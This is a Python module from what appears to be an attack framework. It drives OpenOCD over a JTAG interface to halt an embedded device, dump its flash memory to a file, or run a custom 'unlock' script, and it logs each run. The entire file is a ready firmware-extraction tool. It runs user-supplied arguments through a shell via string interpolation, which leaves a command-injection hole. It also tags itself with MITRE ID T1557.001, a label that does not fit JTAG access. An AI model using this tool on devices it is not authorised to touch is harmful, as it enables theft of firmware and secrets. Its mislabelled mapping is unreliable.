# modules/attacks/embedded_jtag_override.py

import os
import json
import time
import argparse
import subprocess
from datetime import datetime

LOG_PATH = "results/jtag_override_log.json"
MITRE_TTP = "T1557.001"

def log_override(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def jtag_force_unlock(jtag_interface, script=None):
    try:
        if script:
            cmd = f"openocd -f interface/{jtag_interface}.cfg -f {script}"
        else:
            cmd = f"openocd -f interface/{jtag_interface}.cfg -c \"init; halt; dump_image dumped.bin 0x08000000 0x100000; exit\""
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
        log_override({
            "timestamp": datetime.utcnow().isoformat(),
            "jtag_interface": jtag_interface,
            "script_used": script or "default_dump",
            "output": result.stdout,
            "ttp": MITRE_TTP
        })
        return True
    except Exception as e:
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="JTAG Unlock / Override Module")
    parser.add_argument("--interface", required=True, help="OpenOCD JTAG interface config (e.g., stlink, jlink)")
    parser.add_argument("--script", help="Optional custom OpenOCD script for override/unlock")
    args = parser.parse_args()

    if jtag_force_unlock(args.interface, args.script):
        print("[+] JTAG access attempted")
    else:
        print("[!] JTAG override failed")
